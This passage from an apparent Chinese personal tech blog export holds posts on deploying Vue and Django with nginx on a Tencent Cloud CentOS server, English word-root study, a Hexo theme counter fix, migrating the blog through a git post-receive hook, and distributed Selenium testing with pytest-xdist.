<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@VM-24-13-centos mysite]# python  --version</span><br><span class="line">Python 3.6.8</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="端口设置"><a href="#端口设置" class="headerlink" title="端口设置"></a>端口设置</h3><ul>
<li>端口规则，因为腾讯云的端口除了防护墙打开外，还需要单独新建端口规则</li>
</ul>
<p><img src="/aposts/d7b393af/image-20220314102334057.png" alt="image-20220314102334057"></p>
<ul>
<li>服务器开放端口的一些配置：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">firewall-cmd --zone=public --add-port=8100/tcp --permanent</span><br><span class="line">firewall-cmd --zone=public --add-port=8081/tcp --permanent</span><br><span class="line"></span><br><span class="line">firewall-cmd --reload   # 配置立即生效</span><br><span class="line">firewall-cmd --zone=public --list-port # 查看防火墙所有开放的端口</span><br><span class="line"> firewall-cmd --state # 查看防火墙状态</span><br><span class="line">netstat -lnpt # 查看监听的端口</span><br><span class="line">netstat -lnpt |grep 8081# 查看监听的具体端口</span><br></pre></td></tr></table></figure>

<h3 id="nginx配置"><a href="#nginx配置" class="headerlink" title="nginx配置"></a>nginx配置</h3><ul>
<li>查看 Nginx 的默认配置的安装位置</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@VM-24-13-centos git]# nginx -t</span><br><span class="line">nginx: the configuration file /etc/nginx/nginx.conf syntax is ok</span><br><span class="line">nginx: configuration file /etc/nginx/nginx.conf test is successful</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>配置路径</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi /etc/nginx/nginx.conf</span><br><span class="line"></span><br><span class="line">   server &#123;</span><br><span class="line">        listen       8001;</span><br><span class="line">        listen       [::]:8001;</span><br><span class="line">        server_name  www.XXX.123;</span><br><span class="line">        root         /home/dist; # vue的路径</span><br><span class="line">        # Load configuration files for the default server block.</span><br><span class="line">        include /etc/nginx/default.d/*.conf;</span><br><span class="line">        error_page 404 /404.html;</span><br><span class="line">        location = /404.html &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        error_page 500 502 503 504 /50x.html;</span><br><span class="line">        location = /50x.html &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>解压打包的dist压缩包</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@VM-24-13-centos home]# tar -zxvf dist.tar.gz</span><br><span class="line">dist/</span><br><span class="line">dist/css/</span><br><span class="line">dist/css/app.54a7ebec.css</span><br><span class="line">dist/css/chunk-vendors.84bb20f7.css</span><br><span class="line">dist/favicon.ico</span><br><span class="line">dist/fonts/</span><br><span class="line">dist/fonts/element-icons.535877f5.woff</span><br><span class="line">dist/fonts/element-icons.732389de.ttf</span><br><span class="line">dist/img/</span><br><span class="line">dist/img/logo.82b9c7a5.png</span><br><span class="line">dist/index.html</span><br><span class="line">dist/js/</span><br><span class="line">dist/js/app.942844bf.js</span><br><span class="line">dist/js/app.942844bf.js.map</span><br><span class="line">dist/js/chunk-vendors.0b404296.js</span><br><span class="line">dist/js/chunk-vendors.0b404296.js.map</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>重启nginx</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart nginx</span><br></pre></td></tr></table></figure>

<h3 id="django"><a href="#django" class="headerlink" title="django"></a>django</h3><ul>
<li>把django的源代码上传到服务器</li>
<li>安装依赖文件</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /usr/local/mysite</span><br><span class="line">pip install -r requirements.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>测试django是否能运行</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 manage.py runserver 0.0.0.0:8081</span><br></pre></td></tr></table></figure>

<ul>
<li>出现报错文件，类似于</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">corsheaders 文件不存在</span><br></pre></td></tr></table></figure>

<ul>
<li>这个是django装的一个跨域访问的中间件，需要手动安装</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip3 install django-cors-headers</span><br></pre></td></tr></table></figure>

<ul>
<li>再次测试django是否正常，发现报错如下，看字面意思就知道是使用的sqlite版本python必须大于3.8.3</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ile &quot;/usr/local/lib/python3.6/site-packages/django/db/backends/sqlite3/base.py&quot;, line 67, in check_sqlite_version</span><br><span class="line">    raise ImproperlyConfigured(&#x27;SQLite 3.8.3 or later is required (found %s).&#x27; % Database.sqlite_version)</span><br><span class="line">django.core.exceptions.ImproperlyConfigured: SQLite 3.8.3 or later is required (found 3.7.17).</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>修改如下，把版本修改下就即可</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi /usr/local/lib/python3.6/site-packages/django/db/backends/sqlite3/base.py</span><br><span class="line"></span><br><span class="line">def check_sqlite_version():</span><br><span class="line">    if Database.sqlite_version_info &lt; (3, 7, 17):</span><br><span class="line">        raise ImproperlyConfigured(&#x27;SQLite 3.7.17 or later is required (found %s).&#x27; % Database.sqlite_version)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li><p>再次执行就不会报错：<code>python3 manage.py runserver 0.0.0.0:8081</code></p>
</li>
<li><p>直接新建一个sh文件，内容主要是日志记录文件和后台启动，注意日志这里文件要手动提前新建好：</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@VM-24-13-centos mysite]# pwd</span><br><span class="line">/usr/local/mysite</span><br><span class="line">[root@VM-24-13-centos mysite]# vi start_api.sh</span><br><span class="line"></span><br><span class="line">MYDATE=`date +%Y%m%d`</span><br><span class="line">ALL_LOGFILE=/home/api_log/log/log_$MYDATE</span><br><span class="line"></span><br><span class="line">nohup python3 manage.py runserver 0.0.0.0:8081 &gt; $&#123;ALL_LOGFILE&#125; 2&gt;&amp;1 &amp;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>提前查看端口是否没有被占用，如果被占用就直接kill</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -lnpt |grep 8081</span><br></pre></td></tr></table></figure>

<ul>
<li>执行start.sh文件</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sh start.sh</span><br></pre></td></tr></table></figure>

<ul>
<li>最好重启下nginx</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart nginx</span><br></pre></td></tr></table></figure>

<ul>
<li>访问下域名正常</li>
</ul>
<p><img src="/aposts/d7b393af/image-20220314105945414.png" alt="image-20220314105945414"></p>
]]></content>
      <categories>
        <category>vue</category>
      </categories>
      <tags>
        <tag>vue</tag>
        <tag>django</tag>
      </tags>
  </entry>
  <entry>
    <title>英文词缀词根学习</title>
    <url>/aposts/7680d2c2/</url>
    <content><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>90%的单词都是词根+词缀组成，如下：</p>
<p><img src="/aposts/7680d2c2/image-20220913094440926.png" alt="image-20220913094440926"></p>
<h2 id="秒记词根"><a href="#秒记词根" class="headerlink" title="秒记词根"></a>秒记词根</h2><p>元音互换，改变了词性</p>
<p><img src="/aposts/7680d2c2/image-20220913094704642.png" alt="image-20220913094704642"></p>
<h3 id="拼音元音互换"><a href="#拼音元音互换" class="headerlink" title="拼音元音互换"></a>拼音元音互换</h3><p><img src="/aposts/7680d2c2/image-20220913095347765.png" alt="image-20220913095347765"></p>
<h4 id="U-x3D-V-x3D-W"><a href="#U-x3D-V-x3D-W" class="headerlink" title="U&#x3D;V&#x3D;W"></a>U&#x3D;V&#x3D;W</h4><p><img src="/aposts/7680d2c2/image-20220913100636138.png" alt="image-20220913100636138"></p>
<p><img src="/aposts/7680d2c2/image-20220913100725118.png" alt="image-20220913100725118"></p>
<h4 id="b-x3D-p-x3D-m-x3D-f-x3D-v"><a href="#b-x3D-p-x3D-m-x3D-f-x3D-v" class="headerlink" title="b&#x3D;p&#x3D;m&#x3D;f&#x3D;v"></a>b&#x3D;p&#x3D;m&#x3D;f&#x3D;v</h4><p><img src="/aposts/7680d2c2/image-20220913100904732.png" alt="image-20220913100904732"></p>
<h4 id="g-x3D-k-c-x3D-h"><a href="#g-x3D-k-c-x3D-h" class="headerlink" title="g&#x3D;k(c)&#x3D;h"></a>g&#x3D;k(c)&#x3D;h</h4><p><img src="/aposts/7680d2c2/image-20220913101442142.png" alt="image-20220913101442142"></p>
<h4 id="m-x3D-n-x3D-l-x3D-r"><a href="#m-x3D-n-x3D-l-x3D-r" class="headerlink" title="m&#x3D;n&#x3D;l&#x3D;r"></a>m&#x3D;n&#x3D;l&#x3D;r</h4><p><img src="/aposts/7680d2c2/image-20220913101714851.png" alt="image-20220913101714851"></p>
<p><img src="/aposts/7680d2c2/image-20220913101827379.png" alt="image-20220913101827379"></p>
<h4 id="d-x3D-t-x3D-S-c-x3D-th"><a href="#d-x3D-t-x3D-S-c-x3D-th" class="headerlink" title="d&#x3D;t&#x3D;S(c)&#x3D;th"></a>d&#x3D;t&#x3D;S(c)&#x3D;th</h4><p>dt互换，S(c)和th互换</p>
<p><img src="/aposts/7680d2c2/image-20220913102039924.png" alt="image-20220913102039924"></p>
<p><img src="/aposts/7680d2c2/image-20220913102243220.png" alt="image-20220913102243220"></p>
<p><img src="/aposts/7680d2c2/image-20220913102319133.png" alt="image-20220913102319133"></p>
<h3 id="英文元音互换"><a href="#英文元音互换" class="headerlink" title="英文元音互换"></a>英文元音互换</h3><ul>
<li><p>英语中有26个字母，其中5个元音字母和21个辅音字母。5个元音字母分别为：a[ei]、e[i:]、i[ ai]、o[eu]、u[ju:]。元音发音时声带震动、气流通过口腔不受阻碍</p>
</li>
<li><p><strong>词源不变，语音改变</strong></p>
</li>
</ul>
<p><img src="/aposts/7680d2c2/image-20220913095257600.png" alt="image-20220913095257600"></p>
<p><img src="/aposts/7680d2c2/image-20220913100438436.png" alt="image-20220913100438436"></p>
<h2 id="无词根"><a href="#无词根" class="headerlink" title="无词根"></a>无词根</h2><p><img src="/aposts/7680d2c2/image-20220913102729501.png" alt="image-20220913102729501"></p>
<p><img src="/aposts/7680d2c2/image-20220913102822900.png" alt="image-20220913102822900"></p>
<p><img src="/aposts/7680d2c2/image-20220913102948406.png" alt="image-20220913102948406"></p>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><ul>
<li>本文主要来自于<a href="https://www.bilibili.com/video/BV1jR4y1W7bj?spm_id_from=333.999.0.0">这里</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/50861984">英语词根词缀记忆大全简化版</a></li>
<li><a href="https://github.com/Dictionaryphile/1000_Eng_Dicts">1000_Eng_Dicts</a></li>
</ul>
]]></content>
      <categories>
        <category>英语学习</category>
      </categories>
      <tags>
        <tag>英语学习</tag>
      </tags>
  </entry>
  <entry>
    <title>解决live2d和busuanzi不蒜子冲突最新解决方案</title>
    <url>/aposts/e3bdec4f/</url>
    <content><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><ul>
<li>按照官网给出的配置后，发现底部和每个文章都不展示统计数据，查询到资料是<code>live2d</code>和<code>busuanzi</code>冲突引起，最终解决方案如下</li>
</ul>
<h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><ul>
<li><p>解决网站底部不展示统计数据，打开<code>\themes\next\layout\_third-party\statistics\busuanzi-counter.swig</code>,将</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;post-meta-item&quot;</span> <span class="attr">id</span>=<span class="string">&quot;busuanzi_container_site_uv&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display: none;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;post-meta-item&quot;</span> <span class="attr">id</span>=<span class="string">&quot;busuanzi_container_site_pv&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display: none;&quot;</span>&gt;</span></span><br><span class="line">修改  </span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;post-meta-item&quot;</span> <span class="attr">id</span>=<span class="string">&quot;busuanzi_container_site_uv&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display: none;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;post-meta-item&quot;</span> <span class="attr">id</span>=<span class="string">&quot;busuanzi_container_site_pv&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display: none;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p><img src="/aposts/e3bdec4f/image-20211014155848022.png" alt="image-20211014155848022"></p>
<ul>
<li><p>解决文章标题下不展示统计数据，我看很多人都是修改源<code>busuanzi.pure.mini.js</code>文件，最终我新增了个 style属性就行，打开<code>\themes\next\layout\_macro\post.swig</code> ,新增style属性</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;%- if not is_index and theme.busuanzi_count.enable and theme.busuanzi_count.post_views %&#125;</span><br><span class="line">      <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="selector-id">#busuanzi_container_page_pv</span> &#123;<span class="attribute">display</span>:inline <span class="meta">!important</span>;<span class="attribute">margin-left</span>:<span class="number">10px</span>;&#125;</span></span><br><span class="line"><span class="language-css">      </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;post-meta-item&quot;</span> <span class="attr">title</span>=<span class="string">&quot;&#123;&#123; __(&#x27;post.views&#x27;) &#125;&#125;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;busuanzi_container_page_pv&quot;</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">          <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;post-meta-item-icon&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">&quot;&#123;&#123; theme.busuanzi_count.post_views_icon &#125;&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;post-meta-item-text&quot;</span>&gt;</span>&#123;&#123; __(&#x27;post.views&#x27;) + __(&#x27;symbol.colon&#x27;) &#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">&quot;busuanzi_value_page_pv&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">      &#123;%- endif %&#125;</span><br></pre></td></tr></table></figure>



<p><img src="/aposts/e3bdec4f/image-20211014155808658.png" alt="image-20211014155808658"></p>
</li>
</ul>
]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>迁移博客到腾讯云</title>
    <url>/aposts/830a4d3a/</url>
    <content><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><ul>
<li>之前博客在gitee pages写，最近老是抽风说我的内容出现违规文字，然后又不提示具体哪些内容违规，因此迁移到腾讯云上</li>
<li>需要提前准备：腾讯云主机和已经备案的域名</li>
<li>核心流程其实就算本地写博客内容，最终把source目录下面的静态内容推送到远程服务器上（腾讯云，gitee page）</li>
</ul>
<h2 id="腾讯云配置"><a href="#腾讯云配置" class="headerlink" title="腾讯云配置"></a>腾讯云配置</h2><h3 id="安装git"><a href="#安装git" class="headerlink" title="安装git"></a>安装git</h3><ul>
<li>安装依赖库</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install curl-devel expat-devel gettext-devel openssl-devel zlib-devel </span><br></pre></td></tr></table></figure>

<ul>
<li>安装编译工具</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install gcc perl-ExtUtils-MakeMaker package</span><br></pre></td></tr></table></figure>

<ul>
<li>选择一个目录来存放下载下来的 git 安装包。这里选择了<code>/usr/local/src</code> 目录</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /usr/local/src</span><br></pre></td></tr></table></figure>

<ul>
<li>到官网找一个新版稳定的源码包下载到 <code>/usr/local/src</code> 文件夹里</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@VM-24-13-centos src]# wget --no-check-certificate  https://www.kernel.org/pub/software/scm/git/git-2.16.2.tar.gz</span><br></pre></td></tr></table></figure>

<ul>
<li>解压编译git</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tar -zvxf git-2.16.2.tar.gz</span><br><span class="line">cd git-2.16.2</span><br><span class="line">make all prefix=/usr/local/git</span><br></pre></td></tr></table></figure>

<ul>
<li>安装 git 到 <code>/usr/local/git</code> 目录下</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">make install prefix=/usr/local/git</span><br></pre></td></tr></table></figure>

<ul>
<li>配置git环境变量</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &#x27;export PATH=$PATH:/usr/local/git/bin&#x27; &gt;&gt; /etc/bashrc</span><br><span class="line">source /etc/bashrc</span><br><span class="line">[root@VM-24-13-centos git-2.16.2]# git --version</span><br><span class="line">git version 1.8.3.1</span><br></pre></td></tr></table></figure>

<ul>
<li>创建 git 仓库，用于存放博客网站资源，在 <code>home/git</code> 的目录下，创建一个名为<code>hexoBlog</code>的裸仓库（bare repo）。</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir /home/git/</span><br><span class="line">chown -R $USER:$USER /home/git/</span><br><span class="line">chmod -R 755 /home/git/</span><br></pre></td></tr></table></figure>

<ul>
<li>然后，执行如下命令</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /home/git/</span><br><span class="line">[root@VM-24-13-centos git]# git init --bare hexoBlog.git</span><br><span class="line">Initialized empty Git repository in /home/git/hexoBlog.git/</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>创建一个新的 git 钩子，用于自动部署，在 <code>/home/git/hexoBlog.git</code> 下，有一个自动生成的 <code>hooks</code> 文件夹。我们需要在里边新建一个新的钩子文件 <code>post-receive</code>。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi /home/git/hexoBlog.git/hooks/post-receive</span><br></pre></td></tr></table></figure>

<ul>
<li>在该文件中添加两行代码（将下边的代码粘贴进去)，指定 Git 的工作树（源代码）和 Git 目录（配置文件等）</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">git --work-tree=/home/hexoBlog --git-dir=/home/git/hexoBlog.git checkout -f</span><br></pre></td></tr></table></figure>

<ul>
<li>修改文件权限，使得其可执行</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chmod +x /home/git/hexoBlog.git/hooks/post-receive</span><br></pre></td></tr></table></figure>

<ul>
<li>到这里，我们的 git 仓库算是完全搭建好了。下面进行 Nginx 的配置。</li>
</ul>
<h3 id="nginx"><a href="#nginx" class="headerlink" title="nginx"></a>nginx</h3><ul>
<li>安装nginx</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install -y nginx</span><br></pre></td></tr></table></figure>

<ul>
<li>启动发现报错了</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl start nginx</span><br></pre></td></tr></table></figure>

<ul>
<li>查看下撒情况</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl status nginx.service</span><br><span class="line">Feb 25 09:20:06 VM-24-13-centos systemd[1]: Failed to start The nginx HTTP and reverse proxy server.</span><br></pre></td></tr></table></figure>

<ul>
<li>我之前转过httpd服务，默认用的也是80端口，把httpd服务停掉即可</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@VM-24-13-centos git]# systemctl stop httpd</span><br><span class="line">[root@VM-24-13-centos git]# systemctl start nginx</span><br><span class="line">[root@VM-24-13-centos git]#</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>测试nginx，<code>wget http://127.0.0.1</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@VM-24-13-centos git]# wget http://127.0.0.1</span><br><span class="line">--2022-02-25 09:24:52--  http://127.0.0.1/</span><br><span class="line">Connecting to 127.0.0.1:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 4833 (4.7K) [text/html]</span><br><span class="line">Saving to: ‘index.html’</span><br></pre></td></tr></table></figure>

<ul>
<li>配置 Nginx 托管文件目录，创建 <code>/home/hexoBlog</code>目录，用于 Nginx 托管</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir /home/hexoBlog/</span><br><span class="line">chown -R $USER:$USER /home/hexoBlog/</span><br><span class="line">chmod -R 755 /home/hexoBlog/</span><br></pre></td></tr></table></figure>

<ul>
<li>查看 Nginx 的默认配置的安装位置</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@VM-24-13-centos git]# nginx -t</span><br><span class="line">nginx: the configuration file /etc/nginx/nginx.conf syntax is ok</span><br><span class="line">nginx: configuration file /etc/nginx/nginx.conf test is successful</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>修改Nginx的默认配置，其中 cd 后边就是刚才查到的安装位置</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi /etc/nginx/nginx.conf</span><br></pre></td></tr></table></figure>

<p>将其中的 root 值改为 <code>/home/hexoBlog</code> （刚才创建的托管仓库目录）。将 server_name 值改成你的域名。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user root; #我这里改为了root</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">    listen 80 default_server;</span><br><span class="line">    listen [::]:80 default_server;</span><br><span class="line">    root /home/hexoBlog;    #需要修改</span><br><span class="line">    </span><br><span class="line">    server_name www.shikun.work; #需要修改</span><br><span class="line">    </span><br><span class="line">    # Load configuration files for the default server block.</span><br><span class="line">    include /etc/nginx/default.d/*.conf;</span><br><span class="line">    location / &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    error_page 404 /404.html;</span><br><span class="line">        location = /40x.html &#123;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>重启nginx服务</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart nginx</span><br></pre></td></tr></table></figure>

<p>至此，服务器端配置就结束了。接下来，就剩下本地 hexo 的配置更改了。</p>
<h2 id="修改hexo配置"><a href="#修改hexo配置" class="headerlink" title="修改hexo配置"></a>修改hexo配置</h2><ul>
<li>打开你本地的 hexo 博客所在文件，打开站点配置文件（不是主题配置文件），做以下修改。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: root@ip:/home/git/hexoBlog</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure>

<ul>
<li>打开hexo根目录执行，输入密码即可提交到云服务器</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo cl &amp;&amp; hexo g &amp;&amp; hexo d</span><br></pre></td></tr></table></figure>

<p><img src="/aposts/830a4d3a/image-20220225102722571.png" alt="image-20220225102722571"></p>
]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>环境搭建</tag>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>这才是你要的分布式测试</title>
    <url>/aposts/d8b0934a/</url>
    <content><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><ul>
<li><p><a href="/aposts/c43e961e">前面文章</a>介绍了如何利用<code>docker</code>搭建<code>selenium grid</code></p>
</li>
<li><p><code>selenium grid</code>由一个中心<code>Hub</code>节点和大于等于1个的<code>Node</code>节点组成，所有的<code>Node</code>节点都要注册到<code>Hub</code>节点。测试执行时所有的请求发送到<code>Hub</code>节点，<code>Hub</code>节点再将执行指令分发到多个注册的<code>Node</code>节点，<code>Node</code>节点是真正执行Web测试的节点，就相当于<code>selenium</code>本机执行一样。</p>
</li>
<li><p>网上很多教程都是使用多进程&#x2F;多线程启动多个<code>node</code>去执行用例，这样的意义并不大，如果一个<code>Node</code>中的用例太多，并不会节约多少时间，如果开启太多的进程用<code>node</code>去跑用例，无论是管理用例的复杂性和损耗资源都不是成正比</p>
</li>
<li><p>正确的使用场景是一个<code>node</code>里面再去分布式执行用例，其实<code>java</code>中的<code>testng</code>提供这样的功能，而此次我介绍的是用<code>python</code>，因此需要集结合<code>pytest</code></p>
</li>
</ul>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul>
<li>本机<code>window10</code>安装好<code>python3</code> </li>
<li><code>pytest</code></li>
<li><code>pytest-html</code> 生成测试报告插件</li>
<li><code>pytest-xdist 分布式用例</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install pytest</span><br><span class="line">pip install pytest-xdist</span><br><span class="line">pip install pytest-html</span><br></pre></td></tr></table></figure>

<ul>
<li>修改<code>pytest</code>源代码文件，解决报告乱码问题</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">D:\app\Python37\Lib\site-packages\pytest_html\plugin.py</span><br><span class="line"></span><br><span class="line">   class TestResult:</span><br><span class="line">        def __init__(self, outcome, report, logfile, config):</span><br><span class="line">            #self.test_id = report.nodeid.encode(&quot;utf-8&quot;).decode(&quot;unicode_escape&quot;)</span><br><span class="line">            self.test_id = re.sub(r&#x27;(\\u[a-zA-Z0-9]&#123;4&#125;)&#x27;,lambda x:x.group(1).encode(&quot;utf-8&quot;).decode(&quot;unicode-escape&quot;),report.nodeid)</span><br></pre></td></tr></table></figure>

<ul>
<li>看下我的代码结构</li>
</ul>
<p><img src="/aposts/d8b0934a/image-20220325182337774.png" alt="image-20220325182337774"></p>
<ul>
<li>核心目录是<code>testcase</code>是用例目录，里面分为了大回归、小回归、冒烟文件夹，用例放不同的用例，这样的放的好处非常明显了，大回归包含小回归和冒烟，小回归包含冒烟</li>
<li><code>testcase</code>目录下由<code>conftest.py</code> 这里面对<code>pytest</code>和<code>pytest-html</code>可以进行有些设置</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># conftest.py</span></span><br><span class="line"><span class="keyword">import</span> pytest</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.desired_capabilities <span class="keyword">import</span> DesiredCapabilities</span><br><span class="line"><span class="keyword">from</span> py._xmlgen <span class="keyword">import</span> html</span><br><span class="line"></span><br><span class="line">_driver = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># @pytest.fixture()</span></span><br><span class="line"><span class="meta">@pytest.fixture(<span class="params">scope=<span class="string">&#x27;session&#x27;</span>, autouse=<span class="literal">True</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">driver</span>():</span><br><span class="line">    <span class="keyword">global</span> _driver</span><br><span class="line">    <span class="built_in">print</span>(<span class="number">11111</span>)</span><br><span class="line">    ip = <span class="string">&quot;远程ip&quot;</span></span><br><span class="line">    server = <span class="string">&quot;http://%s:7777/wd/hub&quot;</span> % ip</span><br><span class="line">    <span class="comment"># ip = &quot;localhost&quot;</span></span><br><span class="line">    _driver = webdriver.Remote(</span><br><span class="line">        command_executor=<span class="string">&quot;http://%s:7777/wd/hub&quot;</span> % ip,</span><br><span class="line">        desired_capabilities=DesiredCapabilities.CHROME</span><br><span class="line">    )</span><br><span class="line">    <span class="comment"># 返回数据</span></span><br><span class="line">    <span class="keyword">yield</span> _driver</span><br><span class="line">    <span class="comment"># 实现用例后置</span></span><br><span class="line">    _driver.close()</span><br><span class="line">    _driver.quit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@pytest.mark.hookwrapper</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pytest_runtest_makereport</span>(<span class="params">item</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    当测试失败的时候，自动截图，展示到html报告中</span></span><br><span class="line"><span class="string">    :param 